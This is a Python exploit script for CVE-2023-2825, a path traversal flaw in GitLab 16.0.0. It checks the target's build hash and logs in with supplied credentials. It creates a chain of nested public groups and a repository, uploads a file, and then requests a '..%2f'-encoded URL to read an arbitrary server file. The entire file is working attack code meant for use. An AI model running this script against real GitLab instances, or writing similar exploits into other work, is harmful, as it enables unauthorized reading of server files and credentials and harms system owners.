#!/usr/bin/env python3
import requests
import argparse
import urllib3
import urllib.parse
import re
import string
import random
from pathlib import Path
import json

# Disables a pyright warning, because its annoying
# pyright: reportOptionalMemberAccess=false 
# Disables the InsecureRequestWarning because we set verify to False because of proxies
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Global variable for the args
args = None

REUSE_PATH = Path("CVE-2023-2825-reuse-url.txt")

def log_success(msg: str):
    """
    Logs a success message to stdout

    Arguments:
        msg(str): The message to log
    """
    print(f"[+] {msg}")

def log_failure(msg: str):
    """
    Logs a failure message to stdout

    Arguments:
        msg(str): The message to log
    """
    print(f"[-] {msg}")

def log_info(msg: str):
    """
    Logs a info message to stdout

    Arguments:
        msg(str): The message to log
    """
    print(f"[*] {msg}")

def log_result(msg: str):
    """
    Logs a result message to stdout

    Arguments:
        msg(str): The message to log
    """
    print(f"[>] {msg}")

def parse_args() -> argparse.Namespace:
    """
    Parses the command line args
    Required arguments are marked by a star (*)

    Returns:
        argparse.Namespace: the parsed args
    """

    # Add some default checks 
    parser = argparse.ArgumentParser(description="CVE-2023-2825 exploit script by cc3305")
    parser.add_argument("URL", action="store", help="Target url. If a base url is supplied (e.g. http://gitlab.com, then a username and password is required. If a file path is supplied (ends in /file) no authentication is needed.")
    parser.add_argument("-f", "--force", action="store_true", help="Force the exploit (skip the check if the host is vulnerable)")
    parser.add_argument("-x", "--proxy", action="store", help="HTTP proxy in the format http://127.0.0.1:8080")
    parser.add_argument("-H", "--headers", action="append", help="Request Headers in the format `\"Header-Name: Header-Value\"`. Multiple -H flags are allowed")
    parser.add_argument("-c", "--cookie", action="store", help="Cookie data in the format `\"COOKIE1=VALUE1; COOKIE2=VALUE2\"`")
    parser.add_argument("-n", action="store", type=int, default=12, help="The amount of groups to create. N+1 groups are needed to traverse N groups. Usually 12 are enough to reach the filesystem root folder.")
    parser.add_argument("--no-reuse", action="store_true", help="If set to true, the file path url wont be saved and reused.")
    parser.add_argument("-u", "--username", action="store", help="The username of a gitlab account.")
    parser.add_argument("-p", "--password", action="store", help="The password of a gitlab account.")

    # Add more checks according to exploit, e.g. add a "--command" for a RCE exploit
    parser.add_argument("-FP", "--file-path", action="store", help="* The filepath of the file to read from the server.", required=True)
    
    # Return the parsed args
    result = parser.parse_args()

    # Bring the proxy, cookies and headers into a pythonic format
    result.proxy = {"http": result.proxy, "https": result.proxy}

    headers = {}
    if(result.headers != None):
        for header in result.headers:
            try:
                header_parts = header.split(":")
                headers[header_parts[0]] = header_parts[1].lstrip()
            except:
                continue
    result.headers = headers

    cookies = {}
    if(result.cookie != None):
        for cookie in result.cookie.split(";"):
            try:
                cookie_parts = cookie.split("=")
                cookies[cookie_parts[0]] = cookie_parts[1]
            except:
                continue
    result.cookie = cookies

    # The program always assumes the url is in the format http://something.com/, not in http://something.com
    if not result.URL.endswith("/"):
        result.URL = f"{result.URL}/"

    return result

vulnerable_gitlab_versions = {
  "280a09dbca836a6eedf5da1e63953fe8da44bf4c": "gitlab-ee:16.0.0",
  "4396cbf0cf1763e6a04e": "gitlab-ee:16.0.0",
  "917d3f7ad12438a8ec7177d32114073ec479998a": "gitlab-ce:16.0.0",
  "a85656b83770ffb391aa": "gitlab-ce:16.0.0"
}

def check_vulnerable():
    """
    Check if the target is vulnerable
    If there is no way to determine if the host is vulnerable just return true

    Returns:
        bool: True if the target is vulnerable, False otherwire
    """
    # Look up the build hash 
    manifest_response = requests.get(f"{args.URL}assets/webpack/manifest.json", headers=args.headers, proxies=args.proxy, cookies=args.cookie, allow_redirects=False)
    if manifest_response.status_code != requests.codes.ok:
        log_failure("Could not find gitlab version")
        return False

    manifest_json = json.loads(manifest_response.text)
    version_hash = manifest_json["hash"]
    if version_hash not in vulnerable_gitlab_versions:
        log_failure("Gitlab version not vulnerable")
        return False

    version = vulnerable_gitlab_versions[version_hash]
    log_success(f"Vulnerable version {version} found!")
    return True

def get_csrf_token(session: requests.Session) -> tuple[bool, str]:
    """
    Parses a csrf token from the sign in page

    Arguments:
        session(Session): A requests session object

    Returns:
         bool, str: True if everything is ok and the csrf token
    """
    csrf_response = session.get(f"{args.URL}users/sign_in", cookies=args.cookie, proxies=args.proxy, headers=args.headers, verify=False)
    if csrf_response.status_code != requests.codes.ok:
        log_failure("Something went wrong while making a request to get a crsf token")
        return False, ""
    return parse_csrf_token(csrf_response)

def parse_csrf_token(response: requests.Response) -> tuple[bool, str]:
    """
    Parses the csrf token from a response from gitlab

    Arguments:
        response(Response): The response of a request to gitlab

    Returns:
        bool, str: True if everything is ok and the csrf token
    """
    csrf_regex_pattern = r'<meta name="csrf-token" content="(.*)" \/>'
    csrf_token_match = re.search(csrf_regex_pattern, response.text)
    if not csrf_token_match:
        log_failure("CSRF token could not be parsed from server response")
        return False, ""
    csrf_token = csrf_token_match.group(1)
    return True, csrf_token

def login(session: requests.Session, csrf_token: str) -> bool:
    """
    Sends a login request with the give username and password

    Arguments:
        session(Session): A requests session
        csrf_token(str): A csrf token for gitlab

    Returns:
        bool: True if logged in successfully
    """
    login_data = {"user[login]": args.username, "user[password]": args.password, "authenticity_token": csrf_token}
    login_resp = session.post(f"{args.URL}users/sign_in", data=login_data, verify=False, headers=args.headers, cookies=args.cookie, proxies=args.proxy, allow_redirects=False)
    if login_resp.status_code == 302:
        log_success(f"Logged in as {args.username}")
        return True
    log_failure(f"Could not log in as {args.username}")
    return False

def generate_group_prefix(length: int = 3) -> str:
    """
    Generates a random group prefix

    Arguments:
        length(int): Optional. The length of the group prefix

    Returns:
        str: The generated group prefix
    """
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))

def create_groups_and_repo(session: requests.Session) -> tuple[bool, str]:
    """
    Creates n nested subgroups, a repo and uploads a file

    Arguments:
        session(Session): A session

    Returns:
        bool, str: True if successfully created everything, create file url path
    """
    prefix = generate_group_prefix()

    last_group_id = ""
    current_csrf_token = get_csrf_token(session)
    for i in range(1, args.n + 1):
        # Create a group, potentially with a parent
        current_name = f"{prefix}{i}"
        post_data = {
            "group[parent_id]": last_group_id,
            "group[name]": current_name,
            "group[path]": current_name,
            "group[visibility_level]": 20,
            "user[role]": "software_developer",
            "group[jobs_to_be_done]": "",
            "authenticity_token": current_csrf_token
        }
        resp = session.post(f"{args.URL}groups", data=post_data, headers=args.headers, proxies=args.proxy, cookies=args.cookie, verify=False)
        if resp.status_code != 200:
            log_failure(f"Group {current_name} could not be created")
            return False, ""

        csrf_ok, current_csrf_token = parse_csrf_token(resp)
        if not csrf_ok:
            log_failure(f"Could not parse csrf token from group create response {current_name}")
            return False, ""

        log_info(f"Created group {current_name}")

        # Parse the group id of the group that was just created
        pattern = r"data-clipboard-text=\"(\d+)\" type=\"button\" title=\"Copy group ID\""
        matches = re.search(pattern, resp.text)
        if matches is None or len(matches.groups()) < 1 or matches.groups()[0] is None:
            log_failure(f"Could not get group id for {current_name}: {matches}. Does the user have permission to create groups?")
            return False, ""

        last_group_id = matches.groups()[0] 

    # Create a repo
    project_data = {
        "project[ci_cd_only]": "false",
        "project[name]": "cc3305",
        "project[selected_namespace_id]": last_group_id,
        "project[namespace_id]": last_group_id,
        "project[path]": "cc3305",
        "project[visibility_level]": 20,
        "project[initialize_with_readme]": 1,
        "authenticity_token": current_csrf_token
    }
    project_create_resp = session.post(f"{args.URL}projects", data=project_data, headers=args.headers, proxies=args.proxy, cookies=args.cookie, verify=False)
    if project_create_resp.status_code != 200:
        log_failure(f"Could not create repo")
        return False, ""

    csrf_ok, current_csrf_token = parse_csrf_token(project_create_resp)
    if not csrf_ok:
        log_failure(f"Could not parse csrf token from project creation response")
        return False, ""

    repo_path = urllib.parse.urlparse(project_create_resp.url).path
    log_success(f"Created {repo_path} repo nested in {args.n} groups.")

    # upload a file
    additional_headers = {"X-CSRF-Token": current_csrf_token}
    total_headers = args.headers | additional_headers
    file_to_upload = {"file": "cc3305"}
    file_upload_resp = session.post(f"{args.URL}{repo_path}/uploads", files=file_to_upload, headers=total_headers, proxies=args.proxy, cookies=args.cookie, verify=False)
    if file_upload_resp.status_code != 200:
        log_failure(f"Could not upload file {file_to_upload} to {repo_path}")
        return False, ""

    # Get file url from response
    uploaded_file_url = file_upload_resp.json()["link"]["url"]
    log_success(f"Uploaded file under {uploaded_file_url}")
    return True, f"{repo_path}{uploaded_file_url}"

def save_reuse(url: str):
    """
    Saves a url to the reuse file "CVE-2023-2825-reuse-url.txt"

    Arguments:
        url(str): The url to save
    """
    if args.no_reuse:
        return
    
    # Write url to reuse file
    with open(REUSE_PATH, "w") as f:
        f.write(url)

def read_reuse() -> tuple[bool, str]:
    """
    Reads the reuse url file "CVE-2023-2825-reuse-url.txt" and checks its content

    Returns:
        bool, str: True if file is there and content is valid and the url
    """
    if args.no_reuse:
        return False, ""
    
    # Reuse file doesnt exist
    if not REUSE_PATH.exists():
        return False, ""
    
    # Read reuse file
    content = ""
    with open(REUSE_PATH, "r") as f:
        content = f.read()

    # Check if it is really just a url
    url = urllib.parse.urlparse(content)
    if url.scheme == '' or url.hostname == '' or url.path == '':
        log_failure(f"Failed to read reuse file, url {url} invalid")
        return False, ""
    return True, content

def check_reuse():
    """
    Checks for the reuse file and uses it if it exists
    """
    reuse_ok, url = read_reuse()
    if not reuse_ok:
        return
    log_info(f"Using reuse url from file {REUSE_PATH}")
    args.URL = url
    args.username = None
    args.password = None
    

def run_exploit():
    """
    Where most of the magic happens
    """
    session = requests.Session()
    csrf_ok, csrf_token = get_csrf_token(session)

    if not csrf_ok:
        log_failure("Could not parse csrf token")
        return

    # No full filepath was given
    if args.url_path == "/":
        if args.username is None or args.password is None:
            log_failure("Neither a full file path nor username and password were give")
            return
        # Login, create groups and repo
        login(session, csrf_token)
        repo_ok, args.url_path = create_groups_and_repo(session)
        if not repo_ok:
            log_failure(f"Failed to create groups and repo")
            return
        
        # Make sure there is a slash at the end and none at the end
        if not args.url_path.endswith("/"):
            args.url_path = f"{args.url_path}/"
        if args.url_path.startswith("/"):
            args.url_path = args.url_path[1:]
        log_info(f"Url for reuse: {args.url_path}")
        save_reuse(f"{args.URL}{args.url_path}")
        
    # Construct the file read url, looks like http://example.com/{nested_groups}/{repo}/uploads/{hash}/..%2f(..%2f)*n-1%2fto_read.txt
    log_info(f"Using {args.url_path}")
    file_read_path = f"{args.url_path.replace("/file", "")}"
    file_read_path += "..%2f" * (args.n - 1) + ".."
    file_read_path += urllib.parse.quote_plus(args.file_path)
    log_info(f"Directory traversal url: {file_read_path}")
    directory_traversal_resp = session.get(f"{args.URL}{file_read_path}", headers=args.headers, proxies=args.proxy, cookies=args.cookie, verify=False)
    if directory_traversal_resp.status_code == 404:
        log_failure(f"Failed to read file {args.file_path}. Not enough groups or file doesn't exists.")
        return
    log_result(f"Result:\n{directory_traversal_resp.text}")

def prepare():
    """
    Does some preparing
    """
    global args 
    # If there is a reuse file and its enabled, use it
    check_reuse()
    
    # If a full file path is provided, login and group creation is not needed
    parsed_url = urllib.parse.urlparse(args.URL)
    args.url_path = parsed_url.path
    args.URL = f"{parsed_url.scheme}://{parsed_url.hostname}/"

def main():
    global args
    args = parse_args()

    prepare()

    if not args.force:
        if not check_vulnerable():
            log_failure(f"Host seems to not be vulnerable, use --force to override")
            exit(0)

    run_exploit()

if __name__ == "__main__":
    main()
